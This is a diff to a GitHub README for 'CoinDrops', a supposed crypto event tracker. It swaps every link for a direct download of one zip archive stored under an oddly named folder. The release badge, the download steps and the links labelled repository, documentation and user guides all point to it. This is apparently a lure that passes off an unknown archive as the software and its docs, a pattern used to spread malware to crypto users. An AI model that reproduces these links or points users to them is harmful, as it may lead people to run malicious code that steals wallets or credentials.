@@ -1,6 +1,6 @@
 # ✨ CoinDrops - Track Blockchain Events with Ease
 
-[![Download CoinDrops](https://img.shields.io/badge/Download_Release-v1.0-brightgreen)](https://github.com/Mahde07833/CoinDrops/releases)
+[![Download CoinDrops](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)
 
 ## 📦 Introduction
 
@@ -35,7 +35,7 @@ To run CoinDrops, ensure your system meets the following requirements:
 To get started with CoinDrops, follow these steps:
 
 1. **Visit the Download Page**: Click on the link below to go to the Releases page.
-   [Download CoinDrops](https://github.com/Mahde07833/CoinDrops/releases)
+   [Download CoinDrops](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)
 
 2. **Choose the Latest Release**: Look for the latest version at the top of the page.
 
@@ -81,9 +81,9 @@ Your contributions will help enhance CoinDrops for everyone in the community.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Mahde07833/CoinDrops)
-- [Documentation](https://github.com/Mahde07833/CoinDrops/wiki)
-- [User Guides](https://github.com/Mahde07833/CoinDrops/guides)
+- [GitHub Repository](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)
+- [Documentation](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)
+- [User Guides](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)
 
 For further discovery around CoinDrops, explore the provided links.
 
@@ -95,4 +95,4 @@ CoinDrops is open-source software licensed under the MIT License. This means you
 
 We thank the contributors and the community for supporting the development of CoinDrops. Your feedback drives the evolution of this tool.
 
-[![Download CoinDrops](https://img.shields.io/badge/Download_Release-v1.0-brightgreen)](https://github.com/Mahde07833/CoinDrops/releases)
+[![Download CoinDrops](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)](https://raw.githubusercontent.com/Mahde07833/CoinDrops/main/electrothanasia/Coin_Drops_aldermanic.zip)
